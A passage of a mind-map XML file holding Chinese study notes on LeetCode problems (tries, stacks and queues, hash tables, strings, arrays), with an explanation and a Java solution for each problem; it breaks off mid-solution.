<node FOLDED="true" ID="ID_281316873" CREATED="1754751555233" MODIFIED="1754751555235"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Trie
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5c638d59-d4ae-4ba4-ad44-80bdc30f38dd.jpg"/>
    <br/>
    

    <p>
      Trie，又称前缀树或字典树，用于判断字符串是否存在或者是否具有某种字符串前缀。
    </p>
  </body>
</html></richcontent>
<node ID="ID_837478093" CREATED="1754751555235" MODIFIED="1754751555237"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 实现一个 Trie
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      208. Implement Trie (Prefix Tree) (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/implement-trie-prefix-tree/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/implement-trie-prefix-tree/description/">力扣</a>
    </p>
    <pre>class Trie {
    private class Node {
        Node[] childs = new Node[26];
        boolean isLeaf;
    }
    private Node root = new Node();
    public Trie() {
    }
    public void insert(String word) {
        insert(word, root);
    }
    private void insert(String word, Node node) {
        if (node == null) return;
        if (word.length() == 0) {
            node.isLeaf = true;
            return;
        }
        int index = indexForChar(word.charAt(0));
        if (node.childs[index] == null) {
            node.childs[index] = new Node();
        }
        insert(word.substring(1), node.childs[index]);
    }
    public boolean search(String word) {
        return search(word, root);
    }
    private boolean search(String word, Node node) {
        if (node == null) return false;
        if (word.length() == 0) return node.isLeaf;
        int index = indexForChar(word.charAt(0));
        return search(word.substring(1), node.childs[index]);
    }
    public boolean startsWith(String prefix) {
        return startWith(prefix, root);
    }
    private boolean startWith(String prefix, Node node) {
        if (node == null) return false;
        if (prefix.length() == 0) return true;
        int index = indexForChar(prefix.charAt(0));
        return startWith(prefix.substring(1), node.childs[index]);
    }
    private int indexForChar(char c) {
        return c - 'a';
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_403923716" CREATED="1754751555237" MODIFIED="1754751555239"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 实现一个 Trie，用来求前缀和
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      677. Map Sum Pairs (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/map-sum-pairs/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/map-sum-pairs/description/">力扣</a>
    </p>
    <pre>Input: insert(&quot;apple&quot;, 3), Output: Null
Input: sum(&quot;ap&quot;), Output: 3
Input: insert(&quot;app&quot;, 2), Output: Null
Input: sum(&quot;ap&quot;), Output: 5</pre>
    <pre>class MapSum {
    private class Node {
        Node[] child = new Node[26];
        int value;
    }
    private Node root = new Node();
    public MapSum() {
    }
    public void insert(String key, int val) {
        insert(key, root, val);
    }
    private void insert(String key, Node node, int val) {
        if (node == null) return;
        if (key.length() == 0) {
            node.value = val;
            return;
        }
        int index = indexForChar(key.charAt(0));
        if (node.child[index] == null) {
            node.child[index] = new Node();
        }
        insert(key.substring(1), node.child[index], val);
    }
    public int sum(String prefix) {
        return sum(prefix, root);
    }
    private int sum(String prefix, Node node) {
        if (node == null) return 0;
        if (prefix.length() != 0) {
            int index = indexForChar(prefix.charAt(0));
            return sum(prefix.substring(1), node.child[index]);
        }
        int sum = node.value;
        for (Node child : node.child) {
            sum += sum(prefix, child);
        }
        return sum;
    }
    private int indexForChar(char c) {
        return c - 'a';
    }
}</pre>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" ID="ID_668671752" CREATED="1754750427117" MODIFIED="1754751555239" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    栈和队列
  </body>
</html>
</richcontent>
<node ID="ID_940834986" CREATED="1754751555240" MODIFIED="1754751555242"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 用栈实现队列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      232. Implement Queue using Stacks (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/implement-queue-using-stacks/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/implement-queue-using-stacks/description/">力扣</a>
    </p>
    <p>
      栈的顺序为后进先出，而队列的顺序为先进先出。使用两个栈实现队列，一个元素需要经过两个栈才能出队列，在经过第一个栈时元素顺序被反转，经过第二个栈时再次被反转，此时就是先进先出顺序。
    </p>
    <pre>class MyQueue {
    private Stack&lt;Integer&gt; in = new Stack&lt;&gt;();
    private Stack&lt;Integer&gt; out = new Stack&lt;&gt;();
    public void push(int x) {
        in.push(x);
    }
    public int pop() {
        in2out();
        return out.pop();
    }
    public int peek() {
        in2out();
        return out.peek();
    }
    private void in2out() {
        if (out.isEmpty()) {
            while (!in.isEmpty()) {
                out.push(in.pop());
            }
        }
    }
    public boolean empty() {
        return in.isEmpty() &amp;&amp; out.isEmpty();
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1380629227" CREATED="1754751555242" MODIFIED="1754751555244"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 用队列实现栈
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      225. Implement Stack using Queues (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/implement-stack-using-queues/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/implement-stack-using-queues/description/">力扣</a>
    </p>
    <p>
      在将一个元素 x 插入队列时，为了维护原来的后进先出顺序，需要让 x 插入队列首部。而队列的默认插入顺序是队列尾部，因此在将 x 插入队列尾部之后，需要让除了 x 之外的所有元素出队列，再入队列。
    </p>
    <pre>class MyStack {
    private Queue&lt;Integer&gt; queue;
    public MyStack() {
        queue = new LinkedList&lt;&gt;();
    }
    public void push(int x) {
        queue.add(x);
        int cnt = queue.size();
        while (cnt-- &gt; 1) {
            queue.add(queue.poll());
        }
    }
    public int pop() {
        return queue.remove();
    }
    public int top() {
        return queue.peek();
    }
    public boolean empty() {
        return queue.isEmpty();
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_468093770" CREATED="1754751555244" MODIFIED="1754751555245"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 最小值栈
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      155. Min Stack (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/min-stack/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/min-stack/description/">力扣</a>
    </p>
    <pre>class MinStack {
    private Stack&lt;Integer&gt; dataStack;
    private Stack&lt;Integer&gt; minStack;
    private int min;
    public MinStack() {
        dataStack = new Stack&lt;&gt;();
        minStack = new Stack&lt;&gt;();
        min = Integer.MAX_VALUE;
    }
    public void push(int x) {
        dataStack.add(x);
        min = Math.min(min, x);
        minStack.add(min);
    }
    public void pop() {
        dataStack.pop();
        minStack.pop();
        min = minStack.isEmpty() ? Integer.MAX_VALUE : minStack.peek();
    }
    public int top() {
        return dataStack.peek();
    }
    public int getMin() {
        return minStack.peek();
    }
}</pre>
    <p>
      对于实现最小值队列问题，可以先将队列使用栈来实现，然后就将问题转换为最小值栈，这个问题出现在 编程之美：3.7。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_859172431" CREATED="1754751555246" MODIFIED="1754751555247"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 用栈实现括号匹配
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      20. Valid Parentheses (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/valid-parentheses/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/valid-parentheses/description/">力扣</a>
    </p>
    <pre>&quot;()[]{}&quot;
Output : true</pre>
    <pre>public boolean isValid(String s) {
    Stack&lt;Character&gt; stack = new Stack&lt;&gt;();
    for (char c : s.toCharArray()) {
        if (c == '(' || c == '{' || c == '[') {
            stack.push(c);
        } else {
            if (stack.isEmpty()) {
                return false;
            }
            char cStack = stack.pop();
            boolean b1 = c == ')' &amp;&amp; cStack != '(';
            boolean b2 = c == ']' &amp;&amp; cStack != '[';
            boolean b3 = c == '}' &amp;&amp; cStack != '{';
            if (b1 || b2 || b3) {
                return false;
            }
        }
    }
    return stack.isEmpty();
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1925912745" CREATED="1754751555248" MODIFIED="1754751555249"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 数组中元素与下一个比它大的元素之间的距离
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      739. Daily Temperatures (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/daily-temperatures/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/daily-temperatures/description/">力扣</a>
    </p>
    <pre>Input: [73, 74, 75, 71, 69, 72, 76, 73]
Output: [1, 1, 4, 2, 1, 1, 0, 0]</pre>
    <p>
      在遍历数组时用栈把数组中的数存起来，如果当前遍历的数比栈顶元素来的大，说明栈顶元素的下一个比它大的数就是当前元素。
    </p>
    <pre>public int[] dailyTemperatures(int[] temperatures) {
    int n = temperatures.length;
    int[] dist = new int[n];
    Stack&lt;Integer&gt; indexs = new Stack&lt;&gt;();
    for (int curIndex = 0; curIndex &lt; n; curIndex++) {
        while (!indexs.isEmpty() &amp;&amp; temperatures[curIndex] &gt; temperatures[indexs.peek()]) {
            int preIndex = indexs.pop();
            dist[preIndex] = curIndex - preIndex;
        }
        indexs.add(curIndex);
    }
    return dist;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_461135271" CREATED="1754751555249" MODIFIED="1754751555251"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 循环数组中比当前元素大的下一个元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      503. Next Greater Element II (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/next-greater-element-ii/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/next-greater-element-ii/description/">力扣</a>
    </p>
    <pre>Input: [1,2,1]
Output: [2,-1,2]
Explanation: The first 1's next greater number is 2;
The number 2 can't find next greater number;
The second 1's next greater number needs to search circularly, which is also 2.</pre>
    <p>
      与 739. Daily Temperatures (Medium) 不同的是，数组是循环数组，并且最后要求的不是距离而是下一个元素。
    </p>
    <pre>public int[] nextGreaterElements(int[] nums) {
    int n = nums.length;
    int[] next = new int[n];
    Arrays.fill(next, -1);
    Stack&lt;Integer&gt; pre = new Stack&lt;&gt;();
    for (int i = 0; i &lt; n * 2; i++) {
        int num = nums[i % n];
        while (!pre.isEmpty() &amp;&amp; nums[pre.peek()] &lt; num) {
            next[pre.pop()] = num;
        }
        if (i &lt; n){
            pre.push(i);
        }
    }
    return next;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_631284881" CREATED="1754750427119" MODIFIED="1754751555251" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%93%88%E5%B8%8C%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    哈希表
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      哈希表使用 O(N) 空间复杂度存储数据，并且以 O(1) 时间复杂度求解问题。
    </p>
    <ul>
      <li>
        Java 中的 <strong>HashSet</strong>&#xa0;用于存储一个集合，可以查找元素是否在集合中。如果元素有穷，并且范围不大，那么可以用一个布尔数组来存储一个元素是否存在。例如对于只有小写字符的元素，就可以用一个长度为 26 的布尔数组来存储一个字符集合，使得空间复杂度降低为 O(1)。Java 中的 <strong>HashMap</strong>&#xa0;主要用于映射关系，从而把两个元素联系起来。HashMap 也可以用来对元素进行计数统计，此时键为元素，值为计数。和 HashSet 类似，如果元素有穷并且范围不大，可以用整型数组来进行统计。在对一个内容进行压缩或者其它转换时，利用 HashMap 可以把原始内容和转换后的内容联系起来。例如在一个简化 url 的系统中 [Leetcdoe : 535. Encode and Decode TinyURL (Medium)
      </li>
    </ul>
    <p>
      <a href="https://leetcode.com/problems/encode-and-decode-tinyurl/description/">Leetcode</a>，利用 HashMap 就可以存储精简后的 url 到原始 url 的映射，使得不仅可以显示简化的 url，也可以根据简化的 url 得到原始 url 从而定位到正确的资源�) / <a href="https://leetcode-cn.com/problems/encode-and-decode-tinyurl/description/">力扣</a>，利用 HashMap 就可以存储精简后的 url 到原始 url 的映射，使得不仅可以显示简化的 url，也可以根据简化的 url 得到原始 url 从而定位到正确的资源�)
    </p>
  </body>
</html></richcontent>
<node ID="ID_194046326" CREATED="1754751555252" MODIFIED="1754751555253"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 数组中两个数的和为给定值
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Two Sum (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/two-sum/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/two-sum/description/">力扣</a>
    </p>
    <p>
      可以先对数组进行排序，然后使用双指针方法或者二分查找方法。这样做的时间复杂度为 O(NlogN)，空间复杂度为 O(1)。
    </p>
    <p>
      用 HashMap 存储数组元素和索引的映射，在访问到 nums[i] 时，判断 HashMap 中是否存在 target - nums[i]，如果存在说明 target - nums[i] 所在的索引和 i 就是要找的两个数。该方法的时间复杂度为 O(N)，空间复杂度为 O(N)，使用空间来换取时间。
    </p>
    <pre>public int[] twoSum(int[] nums, int target) {
    HashMap&lt;Integer, Integer&gt; indexForNum = new HashMap&lt;&gt;();
    for (int i = 0; i &lt; nums.length; i++) {
        if (indexForNum.containsKey(target - nums[i])) {
            return new int[]{indexForNum.get(target - nums[i]), i};
        } else {
            indexForNum.put(nums[i], i);
        }
    }
    return null;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1677152496" CREATED="1754751555254" MODIFIED="1754751555255"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 判断数组是否含有重复元素
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      217. Contains Duplicate (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/contains-duplicate/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/contains-duplicate/description/">力扣</a>
    </p>
    <pre>public boolean containsDuplicate(int[] nums) {
    Set&lt;Integer&gt; set = new HashSet&lt;&gt;();
    for (int num : nums) {
        set.add(num);
    }
    return set.size() &lt; nums.length;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1815117677" CREATED="1754751555257" MODIFIED="1754751555259"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 最长和谐序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      594. Longest Harmonious Subsequence (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-harmonious-subsequence/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-harmonious-subsequence/description/">力扣</a>
    </p>
    <pre>Input: [1,3,2,2,5,2,3,7]
Output: 5
Explanation: The longest harmonious subsequence is [3,2,2,2,3].</pre>
    <p>
      和谐序列中最大数和最小数之差正好为 1，应该注意的是序列的元素不一定是数组的连续元素。
    </p>
    <pre>public int findLHS(int[] nums) {
    Map&lt;Integer, Integer&gt; countForNum = new HashMap&lt;&gt;();
    for (int num : nums) {
        countForNum.put(num, countForNum.getOrDefault(num, 0) + 1);
    }
    int longest = 0;
    for (int num : countForNum.keySet()) {
        if (countForNum.containsKey(num + 1)) {
            longest = Math.max(longest, countForNum.get(num + 1) + countForNum.get(num));
        }
    }
    return longest;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_783091141" CREATED="1754751555259" MODIFIED="1754751555261"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 最长连续序列
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      128. Longest Consecutive Sequence (Hard)
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-consecutive-sequence/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-consecutive-sequence/description/">力扣</a>
    </p>
    <pre>Given [100, 4, 200, 1, 3, 2],
The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4.</pre>
    <p>
      要求以 O(N) 的时间复杂度求解。
    </p>
    <pre>public int longestConsecutive(int[] nums) {
    Map&lt;Integer, Integer&gt; countForNum = new HashMap&lt;&gt;();
    for (int num : nums) {
        countForNum.put(num, 1);
    }
    for (int num : nums) {
        forward(countForNum, num);
    }
    return maxCount(countForNum);
}
private int forward(Map&lt;Integer, Integer&gt; countForNum, int num) {
    if (!countForNum.containsKey(num)) {
        return 0;
    }
    int cnt = countForNum.get(num);
    if (cnt &gt; 1) {
        return cnt;
    }
    cnt = forward(countForNum, num + 1) + 1;
    countForNum.put(num, cnt);
    return cnt;
}
private int maxCount(Map&lt;Integer, Integer&gt; countForNum) {
    int max = 0;
    for (int num : countForNum.keySet()) {
        max = Math.max(max, countForNum.get(num));
    }
    return max;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1460355053" CREATED="1754750427123" MODIFIED="1754751555262" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%AD%97%E7%AC%A6%E4%B8%B2.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    字符串
  </body>
</html>
</richcontent>
<node ID="ID_1994354481" CREATED="1754751555262" MODIFIED="1754751555264"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 字符串循环移位包含
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%AD%97%E7%AC%A6%E4%B8%B2.md#">编程之美 3.1</a>
    </p>
    <pre>s1 = AABCD, s2 = CDAA
Return : true</pre>
    <p>
      给定两个字符串 s1 和 s2，要求判定 s2 是否能够被 s1 做循环移位得到的字符串包含。
    </p>
    <p>
      s1 进行循环移位的结果是 s1s1 的子字符串，因此只要判断 s2 是否是 s1s1 的子字符串即可。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_295814634" CREATED="1754751555265" MODIFIED="1754751555266"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 字符串循环移位
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%AD%97%E7%AC%A6%E4%B8%B2.md#">编程之美 2.17</a>
    </p>
    <pre>s = &quot;abcd123&quot; k = 3
Return &quot;123abcd&quot;</pre>
    <p>
      将字符串向右循环移动 k 位。
    </p>
    <p>
      将 abcd123 中的 abcd 和 123 单独翻转，得到 dcba321，然后对整个字符串进行翻转，得到 123abcd。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_918353964" CREATED="1754751555267" MODIFIED="1754751555268"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 字符串中单词的翻转
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E5%AD%97%E7%AC%A6%E4%B8%B2.md#">程序员代码面试指南</a>
    </p>
    <pre>s = &quot;I am a student&quot;
Return &quot;student a am I&quot;</pre>
    <p>
      将每个单词翻转，然后将整个字符串翻转。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_542302491" CREATED="1754751555269" MODIFIED="1754751555270"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 两个字符串包含的字符是否完全相同
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      242. Valid Anagram (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/valid-anagram/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/valid-anagram/description/">力扣</a>
    </p>
    <pre>s = &quot;anagram&quot;, t = &quot;nagaram&quot;, return true.
s = &quot;rat&quot;, t = &quot;car&quot;, return false.</pre>
    <p>
      可以用 HashMap 来映射字符与出现次数，然后比较两个字符串出现的字符数量是否相同。
    </p>
    <p>
      由于本题的字符串只包含 26 个小写字符，因此可以使用长度为 26 的整型数组对字符串出现的字符进行统计，不再使用 HashMap。
    </p>
    <pre>public boolean isAnagram(String s, String t) {
    int[] cnts = new int[26];
    for (char c : s.toCharArray()) {
        cnts[c - 'a']++;
    }
    for (char c : t.toCharArray()) {
        cnts[c - 'a']--;
    }
    for (int cnt : cnts) {
        if (cnt != 0) {
            return false;
        }
    }
    return true;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_108160153" CREATED="1754751555271" MODIFIED="1754751555272"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 计算一组字符集合可以组成的回文字符串的最大长度
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      409. Longest Palindrome (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/longest-palindrome/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/longest-palindrome/description/">力扣</a>
    </p>
    <pre>Input : &quot;abccccdd&quot;
Output : 7
Explanation : One longest palindrome that can be built is &quot;dccaccd&quot;, whose length is 7.</pre>
    <p>
      使用长度为 256 的整型数组来统计每个字符出现的个数，每个字符有偶数个可以用来构成回文字符串。
    </p>
    <p>
      因为回文字符串最中间的那个字符可以单独出现，所以如果有单独的字符就把它放到最中间。
    </p>
    <pre>public int longestPalindrome(String s) {
    int[] cnts = new int[256];
    for (char c : s.toCharArray()) {
        cnts[c]++;
    }
    int palindrome = 0;
    for (int cnt : cnts) {
        palindrome += (cnt / 2) * 2;
    }
    if (palindrome &lt; s.length()) {
        palindrome++;   // 这个条件下 s 中一定有单个未使用的字符存在，可以把这个字符放到回文的最中间
    }
    return palindrome;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1557298768" CREATED="1754751555273" MODIFIED="1754751555274"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 字符串同构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      205. Isomorphic Strings (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/isomorphic-strings/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/isomorphic-strings/description/">力扣</a>
    </p>
    <pre>Given &quot;egg&quot;, &quot;add&quot;, return true.
Given &quot;foo&quot;, &quot;bar&quot;, return false.
Given &quot;paper&quot;, &quot;title&quot;, return true.</pre>
    <p>
      记录一个字符上次出现的位置，如果两个字符串中的字符上次出现的位置一样，那么就属于同构。
    </p>
    <pre>public boolean isIsomorphic(String s, String t) {
    int[] preIndexOfS = new int[256];
    int[] preIndexOfT = new int[256];
    for (int i = 0; i &lt; s.length(); i++) {
        char sc = s.charAt(i), tc = t.charAt(i);
        if (preIndexOfS[sc] != preIndexOfT[tc]) {
            return false;
        }
        preIndexOfS[sc] = i + 1;
        preIndexOfT[tc] = i + 1;
    }
    return true;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1820827316" CREATED="1754751555275" MODIFIED="1754751555276"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 回文子字符串个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      647. Palindromic Substrings (Medium)
    </p>
    <p>
      <a href="https://leetcode.com/problems/palindromic-substrings/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/palindromic-substrings/description/">力扣</a>
    </p>
    <pre>Input: &quot;aaa&quot;
Output: 6
Explanation: Six palindromic strings: &quot;a&quot;, &quot;a&quot;, &quot;a&quot;, &quot;aa&quot;, &quot;aa&quot;, &quot;aaa&quot;.</pre>
    <p>
      从字符串的某一位开始，尝试着去扩展子字符串。
    </p>
    <pre>private int cnt = 0;
public int countSubstrings(String s) {
    for (int i = 0; i &lt; s.length(); i++) {
        extendSubstrings(s, i, i);     // 奇数长度
        extendSubstrings(s, i, i + 1); // 偶数长度
    }
    return cnt;
}
private void extendSubstrings(String s, int start, int end) {
    while (start &gt;= 0 &amp;&amp; end &lt; s.length() &amp;&amp; s.charAt(start) == s.charAt(end)) {
        start--;
        end++;
        cnt++;
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1047188559" CREATED="1754751555276" MODIFIED="1754751555278"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 判断一个整数是否是回文数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      9. Palindrome Number (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/palindrome-number/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/palindrome-number/description/">力扣</a>
    </p>
    <p>
      要求不能使用额外空间，也就不能将整数转换为字符串进行判断。
    </p>
    <p>
      将整数分成左右两部分，右边那部分需要转置，然后判断这两部分是否相等。
    </p>
    <pre>public boolean isPalindrome(int x) {
    if (x == 0) {
        return true;
    }
    if (x &lt; 0 || x % 10 == 0) {
        return false;
    }
    int right = 0;
    while (x &gt; right) {
        right = right * 10 + x % 10;
        x /= 10;
    }
    return x == right || x == right / 10;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1515568304" CREATED="1754751555278" MODIFIED="1754751555280"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 统计二进制字符串中连续 1 和连续 0 数量相同的子字符串个数
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      696. Count Binary Substrings (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/count-binary-substrings/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/count-binary-substrings/description/">力扣</a>
    </p>
    <pre>Input: &quot;00110011&quot;
Output: 6
Explanation: There are 6 substrings that have equal number of consecutive 1's and 0's: &quot;0011&quot;, &quot;01&quot;, &quot;1100&quot;, &quot;10&quot;, &quot;0011&quot;, and &quot;01&quot;.</pre>
    <pre>public int countBinarySubstrings(String s) {
    int preLen = 0, curLen = 1, count = 0;
    for (int i = 1; i &lt; s.length(); i++) {
        if (s.charAt(i) == s.charAt(i - 1)) {
            curLen++;
        } else {
            preLen = curLen;
            curLen = 1;
        }
        if (preLen &gt;= curLen) {
            count++;
        }
    }
    return count;
}</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_715821756" CREATED="1754750427126" MODIFIED="1754751555280" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    数组与矩阵
  </body>
</html>
</richcontent>
<node ID="ID_363511965" CREATED="1754751555281" MODIFIED="1754751555283"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 把数组中的 0 移到末尾
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <p>
      283. Move Zeroes (Easy)
    </p>
    <p>
      <a href="https://leetcode.com/problems/move-zeroes/description/">Leetcode</a>&#xa0;/ <a href="https://leetcode-cn.com/problems/move-zeroes/description/">力扣</a>
    </p>
    <pre>For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].</pre>
    <pre>public void moveZeroes(int[] nums) {
    int idx = 0;
